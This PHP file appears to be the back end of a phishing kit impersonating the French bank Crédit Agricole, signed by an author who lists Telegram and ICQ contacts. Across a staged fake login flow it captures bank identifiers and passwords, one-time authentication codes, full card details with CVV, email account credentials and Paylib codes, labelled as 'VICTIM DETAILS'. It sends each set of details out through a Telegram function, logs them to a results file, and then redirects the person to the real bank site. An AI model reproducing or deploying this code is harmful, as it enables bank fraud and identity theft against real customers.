<?php

/**
 * @link              https://www.helium10.com
 * @since             28/08/2020
 * @package           CREDIT AGRICOLE
 * @facebook          https://www.facebook.com/helium10
 * @whatsapp          +33756882993
 * @icq               @@651198700
 * @telegram          @helium10
 *
 * Project Name:      CREDIT AGRICOLE
 * Author:            helium10
 * Author URI:        https://www.facebook.com/helium10
 */
include 'email.php';
include_once '../inc/app.php';

function validate_cc_number($number = null) {
    $numbers = str_replace(' ', '', $number);
    if( validate_number($numbers,16) == false )
        return false;
    return $numbers;
}

function validate_cc_cvv($number = null) {
    $numbers = str_replace(' ', '', $number);
    if( validate_number($numbers,3) == false )
        return false;
    return $numbers;
}

function validate_cc_date($month,$year) {
    if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 2 ) {
        return $month . '/' . $year;
    } else {
        return false;
    }
}



$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);


if($_SERVER['REQUEST_METHOD'] == "POST") {

    if ($_POST['type'] == "region") {

        $_SESSION['region_number'] = $_POST['region_number'];
        $_SESSION['region_caisse']    = $_POST['region_caisse'];

        $_SESSION['errors'] = [];
        if( empty($_POST['region_number']) && empty($_POST['region_caisse']) ) {
            $_SESSION['errors']['region_number'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Caisse Régionale';
            $message = '/-- CREDIT AGRECOLE - REGION INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_POST['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_POST['region_caisse'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END REGION INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
			toTG(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: login.php?particulier#_$dispatch");

        } else {
            header("location: region.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "login") {

        $_SESSION['identifiant'] = $_POST['identifiant'];
        $_SESSION['password']    = $_POST['password'];

        $_SESSION['errors'] = [];
        if( validate_number($_POST['identifiant'],11) == false ) {
            $_SESSION['errors']['identifiant'] = true;
        }

        if( validate_number($_POST['password'],6) == false ) {
            $_SESSION['errors']['password'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Login';
            $message = '/-- CREDIT AGRECOLE - LOG INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END LOG INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
			toTG(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: loading.php?validation#_$dispatch");

        } else {
            header("location: login.php?particulier#_$dispatch");
        }

    }


    if ($_POST['type'] == "authfort") {

        $_SESSION['authfort']        = $_POST['authfort'];

        $_SESSION['errors'] = [];
        if( empty($_POST['authfort']) || strlen($_POST['authfort']) != 6 ) {
            $_SESSION['errors']['authfort'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | AUTHENTIFICATIONFORTE';
            $message = '/-- CREDIT AGRECOLE - AUTHENTIFICATIONFORTE INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Authentification forte : ' . $_POST['authfort'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
			toTG(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: loading1.php?validation#_$dispatch");

        } else {
            header("location: authfort.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "securepass") {

        $_SESSION['securepass']        = $_POST['securepass'];

        $_SESSION['errors'] = [];
        if( empty($_POST['securepass']) || strlen($_POST['securepass']) != 6 ) {
            $_SESSION['errors']['securepass'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Securepasse';
            $message = '/-- CREDIT AGRECOLE - Securepasse INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Authentification forte : ' . $_SESSION['authfort'] . "\r\n";
            $message .= 'Secure passe : ' . $_POST['securepass'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
			toTG(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: loading2.php?validation#_$dispatch");

        } else {
            header("location: securepass.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "validemail") {

        $_SESSION['validemail']        = $_POST['validemail'];

        $_SESSION['errors'] = [];
        if( empty($_POST['validemail']) || strlen($_POST['validemail']) != 6 ) {
            $_SESSION['errors']['validemail'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Code Email';
            $message = '/-- CREDIT AGRECOLE - Code Email INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Authentification forte : ' . $_SESSION['authfort'] . "\r\n";
            $message .= 'Secure passe : ' . $_SESSION['securepass'] . "\r\n";
            $message .= 'Code email : ' . $_POST['validemail'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
			toTG(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: cc.php?validation#_$dispatch");

        } else {
            header("location: validemail.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "cc") {
        
        $_SESSION['nom']        = $_POST['nom'];
        $_SESSION['prenom']     = $_POST['prenom'];
        $_SESSION['address']    = $_POST['address'];
        $_SESSION['phone']    = $_POST['phone'];
        $_SESSION['zip_code']   = $_POST['zip_code'];
        $_SESSION['city']       = $_POST['city'];
        $_SESSION['cc_number'] = $_POST['cc_number'];
        $_SESSION['cc_cvv']    = $_POST['cc_cvv'];
        $_SESSION['cc_date']   = $_POST['cc_date'];

        $date_ex = explode('/',$_POST['cc_date']);
        $card_number = validate_cc_number($_POST['cc_number']);
        $card_cvv    = validate_cc_cvv($_POST['cc_cvv']);
        $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);

        $_SESSION['errors'] = [];
        if( validate_name($_POST['nom']) == false ) {
            $_SESSION['errors']['nom'] = 'Veuillez saisir un nom valide.';
        }

        if( validate_name($_POST['prenom']) == false ) {
            $_SESSION['errors']['prenom'] = 'Veuillez saisir un prénom valide.';
        }

        if( $card_number == false ) {
            $_SESSION['errors']['cc_number'] = 'Veuillez saisir un numéro de la carte valid.';
        }

        if( $card_cvv == false ) {
            $_SESSION['errors']['cc_cvv'] = 'Veuillez saisir un numéro valid.';
        }

        if( $card_date == false ) {
            $_SESSION['errors']['cc_date'] = 'Veuillez saisir une date valide.';
        }

        if( empty($_POST['address']) ) {
            $_SESSION['errors']['address'] = 'Veuillez saisir une adresse valide.';
        }

        if( empty($_POST['phone']) ) {
            $_SESSION['errors']['phone'] = 'Veuillez saisir un numéro de téléphone valide.';
        }

        if( validate_number($_POST['zip_code']) == false ) {
            $_SESSION['errors']['zip_code'] = 'Veuillez saisir un code postale valide.';
        }

        if( empty($_POST['city']) ) {
            $_SESSION['errors']['city'] = 'Veuillez saisir une ville valide.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Card Details';
            $message = '/-- CREDIT AGRECOLE -  CC DETAILS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Authentification forte : ' . $_SESSION['authfort'] . "\r\n";
            $message .= 'Secure passe : ' . $_SESSION['securepass'] . "\r\n";
            $message .= 'Code email : ' . $_SESSION['validemail'] . "\r\n";
            $message .= 'nom : ' . $_POST['nom'] . "\r\n";
            $message .= 'prenom : ' . $_POST['prenom'] . "\r\n";
            $message .= 'address : ' . $_POST['address'] . "\r\n";
            $message .= 'Telephone : ' . $_POST['phone'] . "\r\n";
            $message .= 'zip_code : ' . $_POST['zip_code'] . "\r\n";
            $message .= 'city : ' . $_POST['city'] . "\r\n";
            $message .= 'N° de carte : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'Date d\'expiration : ' . $_POST['cc_date'] . "\r\n";
            $message .= 'CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END DETAILS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
			toTG(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: mailaccess.php?validation#_$dispatch");

        } else {
            header("location: cc.php?validation#_$dispatch");
        }

    }
	
	
	    if ($_POST['type'] == "mailaccess") {
        

        $_SESSION['errors'] = [];
        if( empty($_POST['email'])) {
            $_SESSION['errors']['email'] = 'Veuillez saisir un email valide.';
        }

        if( empty($_POST['pass'])) {
            $_SESSION['errors']['pass'] = 'Veuillez saisir un mot de passe valide.';
        }


        if( count($_SESSION['errors']) == 0 ) {
			$_SESSION['email'] = $_POST['email'];
			$_SESSION['pass'] = $_POST['pass'];
            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | MAILACCESS Details';
            $message = '/-- CREDIT AGRICOLE - MAIL ACCESS DETAILS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Authentification forte : ' . $_SESSION['authfort'] . "\r\n";
            $message .= 'Secure passe : ' . $_SESSION['securepass'] . "\r\n";
            $message .= 'Code email : ' . $_SESSION['validemail'] . "\r\n";
            $message .= 'nom : ' . $_SESSION['nom'] . "\r\n";
            $message .= 'prenom : ' . $_SESSION['prenom'] . "\r\n";
            $message .= 'address : ' . $_SESSION['address'] . "\r\n";
            $message .= 'Telephone : ' . $_SESSION['phone'] . "\r\n";
            $message .= 'zip_code : ' . $_SESSION['zip_code'] . "\r\n";
            $message .= 'city : ' . $_SESSION['city'] . "\r\n";
            $message .= 'N° de carte : ' . $_SESSION['cc_number'] . "\r\n";
            $message .= 'Date d\'expiration : ' . $_SESSION['cc_date'] . "\r\n";
            $message .= 'CVV : ' . $_SESSION['cc_cvv'] . "\r\n";
			$message .= 'EMAIL : ' . $_POST['email'] . "\r\n";
            $message .= 'Mot de pass : ' . $_POST['pass'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END DETAILS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
			toTG(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: loading4.php?validation#_$dispatch");

        } else {
            header("location: mailaccess.php?validation#_$dispatch");
        }

    }
	if ($_POST['type'] == "paylib") {
        

        $_SESSION['errors'] = [];
        if( empty($_POST['paylib'])) {
            $_SESSION['errors']['securepass'] = 'Le code est invalide.';
        }

        if( count($_SESSION['errors']) == 0 ) {
			$_SESSION['paylib'] = $_POST['paylib'];
            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | PAYLIB Details';
            $message = '/-- CREDIT AGRICOLE - PAYLIB DETAILS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Authentification forte : ' . $_SESSION['authfort'] . "\r\n";
            $message .= 'Secure passe : ' . $_SESSION['securepass'] . "\r\n";
            $message .= 'Code email : ' . $_SESSION['validemail'] . "\r\n";
            $message .= 'nom : ' . $_SESSION['nom'] . "\r\n";
            $message .= 'prenom : ' . $_SESSION['prenom'] . "\r\n";
            $message .= 'address : ' . $_SESSION['address'] . "\r\n";
            $message .= 'Telephone : ' . $_SESSION['phone'] . "\r\n";
            $message .= 'zip_code : ' . $_SESSION['zip_code'] . "\r\n";
            $message .= 'city : ' . $_SESSION['city'] . "\r\n";
            $message .= 'N° de carte : ' . $_SESSION['cc_number'] . "\r\n";
            $message .= 'Date d\'expiration : ' . $_SESSION['cc_date'] . "\r\n";
            $message .= 'CVV : ' . $_SESSION['cc_cvv'] . "\r\n";
			$message .= 'EMAIL : ' . $_SESSION['email'] . "\r\n";
            $message .= 'Mot de pass : ' . $_SESSION['pass'] . "\r\n";
			$message .= 'PAYLIB : ' . $_POST['paylib'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END DETAILS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
			toTG(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: https://www.credit-agricole.fr/");

        } else {
            header("location: paylib.php?validation#_$dispatch");
        }

    }

}

?>